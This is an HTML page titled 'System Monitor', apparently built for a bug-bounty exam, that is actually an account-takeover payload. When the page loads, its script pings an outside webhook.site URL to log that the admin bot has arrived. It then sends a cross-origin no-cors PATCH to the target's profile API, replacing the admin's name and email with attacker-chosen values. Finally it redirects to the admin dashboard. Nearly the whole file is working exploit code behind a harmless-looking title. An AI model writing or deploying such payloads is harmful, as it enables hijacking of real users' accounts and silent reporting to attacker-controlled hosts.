<!DOCTYPE html>
<html>
<head>
    <title>System Monitor</title>
</head>
<body>
    <h1>Loading Message ID: 69e166fc...</h1>
    <script>
        const msgId = "69e166fcbee6d6b7c66275b0";
        const webhook = "https://webhook.site/841a65c5-0695-459d-80da-91ae7613c283";
        const targetApi = "https://api-bugbounty-exam.hashacademy.co/api/auth/profile";
        const dashboardUrl = "https://bugbounty-exam.hashacademy.co/admin/messages/" + msgId;

        // 1. Log the bot's arrival
        fetch(webhook + "?status=bot_landed&id=" + msgId);

        // 2. Perform the ATO (PATCH request to change email)
        // We use 'no-cors' to ensure the request fires even if CORS blocks the reading of the response
        fetch(targetApi, {
            method: "PATCH",
            mode: "no-cors",
            headers: { "Content-Type": "text/plain" },
            body: JSON.stringify({
                "fullName": "Admin_Pwned",
                "email": "rundlady@gongjua.com"
            })
        }).then(() => {
            // 3. Force the Admin to "View" the message on the actual platform
            // This satisfies the requirement of the Admin viewing the message
            window.location.href = dashboardUrl;
        });

        // Fallback: If fetch takes too long, redirect anyway after 1 second
        setTimeout(() => {
            window.location.href = dashboardUrl;
        }, 1000);
    </script>
</body>
</html>
